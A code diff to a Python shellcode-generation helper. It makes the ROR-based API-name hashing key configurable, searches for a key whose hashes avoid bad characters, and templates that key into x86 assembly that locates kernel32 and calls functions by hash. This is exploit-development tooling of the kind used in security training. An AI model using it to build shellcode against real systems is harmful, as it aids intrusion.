@@ -1,3 +1,6 @@
+DEFAULT_HASH_KEY = 0xE
+
+
 def convert_ip_addr_hex(ip_addr):
     import ipaddress
 
@@ -30,9 +33,23 @@ def compute_hash(esi, key):
     return edx
 
 
-def push_hash(function_name):
-    hash = compute_hash(function_name, 0xE)
+def push_hash(function_name, key=DEFAULT_HASH_KEY):
+    hash = compute_hash(function_name, key)
     return f"push  {hex(hash)};"
+
+
+def find_hash_key(function_names, bad_chars):
+    for key in range(0x20):
+        if not any(
+            any(c in bad_chars for c in compute_hash(f_name, key).to_bytes(4, "little"))
+            for f_name in function_names
+        ):
+            return key
+
+    print(
+        f"# Cannot find a good hash key, use default key ({hex(DEFAULT_HASH_KEY)}) to compute hash"
+    )
+    return DEFAULT_HASH_KEY
 
 
 def push_string(input_str, bad_chars):
@@ -104,8 +121,8 @@ def find_kernel32():
     """
 
 
-def find_and_call():
-    return """
+def find_and_call(key=DEFAULT_HASH_KEY):
+    return f"""
     find_and_call_shorten:
         jmp find_and_call_shorten_bnc   // Short jump
 
@@ -144,7 +161,7 @@ def find_and_call():
         lodsb                           // Load the next byte from esi into al
         test  al, al                    // Check for NULL terminator
         jz    compute_hash_finished     // If the ZF is set, we've hit the NULL term
-        ror   edx, 0x0e                 // Rotate edx 14 bits to the right
+        ror   edx, {hex(key)}           // Rotate edx key bits to the right
         add   edx, eax                  // Add the new byte to the accumulator
         jmp   compute_hash_again        // Next iteration
 
